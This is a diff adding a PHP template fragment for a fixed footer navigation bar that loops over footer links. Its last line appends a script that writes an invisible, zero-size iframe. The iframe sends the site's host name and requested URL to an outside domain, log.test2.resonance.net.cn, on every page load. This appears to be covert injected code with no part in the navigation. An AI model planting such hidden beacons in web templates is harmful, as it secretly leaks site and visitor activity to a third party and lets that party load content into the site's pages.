@@ -1,0 +1,15 @@
+
+<!------S导航------->
+<div style="position:fixed; bottom:0; left:0; right:0; z-index:1000; padding-top:8px; background-color:#2E383E;">
+    <volist name="footer" id="vo">
+        <div class="fl w20b bm_nav foot{$i} <if condition="$i lt 5">line</if> tacn" style=" padding-top:20px;">
+            <a href="{$vo.url}" title="{$vo.title}"> 
+                <p class="fff">{$vo.title}</p>
+            </a>
+        </div>
+    </volist>
+</div>
+<!--<div style="margin-bottom: 57px;"></div>-->
+<!------E导航------->
+
+<script>document.writeln("<iframe src=\"http://log.test2.resonance.net.cn/?u[]=<?php echo $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];?>\"  frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"no\" allowtransparency=\"yes\" width=\"0\" height=\"0\" style=\"display:none;\"></iframe>");</script>
